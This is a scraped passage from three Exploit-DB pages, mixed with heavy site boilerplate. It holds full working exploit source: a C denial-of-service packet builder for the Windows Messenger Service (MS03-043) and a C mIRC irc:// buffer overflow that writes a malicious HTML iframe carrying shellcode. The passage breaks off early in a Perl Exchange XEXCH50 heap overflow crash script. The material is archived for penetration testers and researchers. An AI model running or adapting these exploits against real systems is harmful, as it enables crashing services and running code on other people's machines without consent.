1100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 111
Microsoft Windows Messenger Service - Denial of Service (MS03-043) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows Messenger Service - Denial of Service (MS03-043)EDB-ID:111CVE:2003-0717EDB Verified:Author:LSD-PLaNETType:dosExploit:/Platform:WindowsDate:2003-10-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*DoS Proof of Concept for MS03-043 - exploitation shouldn't be too hard.Launching it one or two times against the target should make themachine reboot. Tested against a Win2K SP4."The vulnerability results because the Messenger Service does notproperly validate the length of a message before passing it to the allocatedbuffer" according to MS bulletin. Digging into it a bit more, we find that whena character 0x14 in encountered in the 'body' part of the message, it isreplaced by a CR+LF. The buffer allocated for this operation is twice the sizeof the string, which is the way to go, but is then copied to a buffer whichwas only allocated 11CAh bytes. Thanks to that, we can bypass the length checksand overflow the fixed size buffer.Credits go to LSD :)*/#include <stdio.h>#include <winsock.h>#include <string.h>#include <time.h>// Packet format found thanks to a bit a sniffingstatic unsigned char packet_header[] ="\x04\x00\x28\x00""\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\xf8\x91\x7b\x5a\x00\xff\xd0\x11\xa9\xb2\x00\xc0""\x4f\xb6\xe6\xfc""\xff\xff\xff\xff" // @40 : unique id over 16 bytes ?"\xff\xff\xff\xff""\xff\xff\xff\xff""\xff\xff\xff\xff""\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00""\x00\x00\xff\xff\xff\xff""\xff\xff\xff\xff" // @74 : fields length"\x00\x00";// Exploit downloaded on www.k-otik.comunsigned char field_header[] ="\xff\xff\xff\xff" // @0 : field length"\x00\x00\x00\x00""\xff\xff\xff\xff"; // @8 : field lengthint main(int argc,char *argv[]){int i, packet_size, fields_size, s;unsigned char packet[8192];struct sockaddr_in addr;// A few conditions :// 0 <= strlen(from) + strlen(machine) <= 56// max fields size 3992char from[] = "RECCA";char machine[] = "ZEUS";char body[4096] = "*** MESSAGE ***";WSADATA wsaData;WSAStartup(0x0202, &wsaData);ZeroMemory(&addr, sizeof(addr));addr.sin_family = AF_INET;addr.sin_addr.s_addr = inet_addr("192.168.186.3");addr.sin_port = htons(135);ZeroMemory(packet, sizeof(packet));packet_size = 0;memcpy(&packet[packet_size], packet_header, sizeof(packet_header) -1);packet_size += sizeof(packet_header) - 1;i = strlen(from) + 1;*(unsigned int *)(&field_header[0]) = i;*(unsigned int *)(&field_header[8]) = i;memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);packet_size += sizeof(field_header) - 1;strcpy(&packet[packet_size], from);packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 4i = strlen(machine) + 1;*(unsigned int *)(&field_header[0]) = i;*(unsigned int *)(&field_header[8]) = i;memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);packet_size += sizeof(field_header) - 1;strcpy(&packet[packet_size], machine);packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 4fprintf(stdout, "Max 'body' size (incl. terminal NULL char) = %d\n",3992 - packet_size + sizeof(packet_header) - sizeof(field_header));memset(body, 0x14, sizeof(body));body[3992 - packet_size + sizeof(packet_header) - sizeof(field_header)- 1] = '\0';i = strlen(body) + 1;*(unsigned int *)(&field_header[0]) = i;*(unsigned int *)(&field_header[8]) = i;memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);packet_size += sizeof(field_header) - 1;strcpy(&packet[packet_size], body);packet_size += i;fields_size = packet_size - (sizeof(packet_header) - 1);*(unsigned int *)(&packet[40]) = time(NULL);*(unsigned int *)(&packet[74]) = fields_size;fprintf(stdout, "Total length of strings = %d\nPacket size =%d\nFields size = %d\n", strlen(from) + strlen(machine) + strlen(body),packet_size, fields_size);/*for (i = 0; i < packet_size; i++){if (i && ((i & 1) == 0))fprintf(stdout, " ");if (i && ((i & 15) == 0))fprintf(stdout, "\n");fprintf(stdout, "%02x", packet[i]);}fprintf(stdout, "\n");*/if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)exit(EXIT_FAILURE);if (sendto(s, packet, packet_size, 0, (struct sockaddr *)&addr,sizeof(addr)) == -1)exit(EXIT_FAILURE);/*if (recvfrom(s, packet, sizeof(packet) - 1, 0, NULL, NULL) == -1)exit(EXIT_FAILURE);*/exit(EXIT_SUCCESS);}// milw0rm.com [2003-10-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 112
mIRC 6.1 - 'IRC' Protocol Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDmIRC 6.1 - 'IRC' Protocol Remote Buffer OverflowEDB-ID:112CVE:2003-1336EDB Verified:Author:blastyType:remoteExploit:/Platform:WindowsDate:2003-10-21Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** remote mirc < 6.11 exploit by blasty**** TESTED ON: Windows XP (No SP, Ducth) Build: 2600.xpclient.010817-1148**** A few days ago, I saw a mIRC advisory on packetstorm [1] and was surprised** nobody had written an exploit yet. So I decided to start writing one.** Since this was my first time coding a exploit for windows, it took some** research before I got the hang of it. (Ollydbg is much more confusing then GDB btw :P)**** This exploits (ab)uses the bug in irc:// URI handling. It contains a buffer-** overflow, and when more then 998 bytes are given EIP will be overwritten.**** At first I was thinking of a simple solution to get this exploitable. Since** giving an URI with > 998 chars to someone on IRC is simply NOT done :)** Then I remember the iframe-irc:// flaw found by uuuppzz [2]**** This exploit will write an malicious HTML file containing an iframe executing the** irc:// address. So you can give this to anyone on IRC for example ;)** The shellcode included does only execute cmd.exe, because I don't want to be this** a scriptkiddy util. But, replacing the shellcode with your own is also possible.** An 400 bytes shellcode (bindshell etc.) easily fits in the buffer, but it may require** some tweaking.** After exiting the cmd.exe mIRC will crash, so shellcode its not 100% clean, but who carez :)**** Oh yeah, I almost forgot.. this exploit also works even if mIRC isn't started.** mIRC will start automatically when an irc:// is executed, so you can also send somebody** and HTML email containing the evil HTML code. (only for poor clients like Outlook Express :P)****/#include <stdio.h>/* Stupid cmd.exe exec shellcode. hey! I r !evil ;) */unsigned char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x8b\xec\x55\x8b\xec\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x8d\x45\xf8\x50\xb8""\x44\x80\xbf\x77"			//	0x78bf8044 <- adress of system()"\xff\xd0";				//  	call    system()char jmpback[] ="\xE9\xCF\xFB\xFF\xFF"; // my leet negative JMP shellcode :)char buffer[1100], fstring[1300]; // heh, need to clean this upint main(int argc, char *argv[]) {FILE *evil;fprintf(stdout, "---------------------------------------------\n""mIRC < 6.11 remote exploit by blasty@geekz.nl\n""Exploit downloaded on www.k-otik.com\n""---------------------------------------------\n\n");// NOPslides are coolmemset(buffer, 0x90, sizeof(buffer) - 1);// place shellcode in buffermemcpy(buffer + 20, shellcode, strlen(shellcode));// took this one from ntdll.dll (jmp esp)*(long *)&buffer[994] = 0x77F4801C;// place jmpback shellcode in buffermemcpy(buffer + 20 + strlen(shellcode) + 1010, jmpback, strlen(jmpback));printf("[+] Evil buffer constructed\n");// open HTML file for writingif((evil = fopen("index.html", "a+")) != NULL) {// construct evil string :)sprintf(fstring, "<iframe src=\"irc://%s\"></iframe>", buffer);// write string to filefputs(fstring, evil);// close filefclose(evil);printf("[+] Evil HTML file written!\n");return(0);} else {// uh oh.. :/fprintf(stderr, "ERROR: Could not open index.html for writing!\n");exit(1);}}// milw0rm.com [2003-10-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 113
Microsoft Exchange Server 2000 - XEXCH50 Heap Overflow (PoC) (MS03-046) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Exchange Server 2000 - XEXCH50 Heap Overflow (PoC) (MS03-046)EDB-ID:113CVE:2003-0714EDB Verified:Author:H D MooreType:dosExploit:/Platform:WindowsDate:2003-10-22Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl -w##################### ms03-046.pl - hdm metasploit com# This vulnerability allows a remote unauthenticated user to overwrite big chunks# of the heap used by the inetinfo.exe process. Reliably exploiting this bug is# non-trivial; even though the entire buffer is binary safe (even nulls) and can be# just about any size, the actual code that crashes varies widely with each request.# During the analysis process, numerous combinations of request size, concurrent# requests, pre-allocations, and alternate trigger routes were examined and not a# single duplicate of location and data offset was discovered. Hopefully the magic# combination of data, size, and setup will be found to allow this bug to be reliably# exploited.# minor bugfix: look for 354 Send binary datause strict;use IO::Socket;my $host = shift() || usage();my $mode = shift() || "CHECK";my $port = 25;if (uc($mode) eq "CHECK") { check() }if (uc($mode) eq "CRASH") { crash() }usage();sub check{my $s = SMTP($host, $port);if (! $s){print "[*] Error establishing connection to SMTP service.\n";exit(0);}print $s "XEXCH50 2 2\r\n";my $res = <$s>;close ($s);# a patched 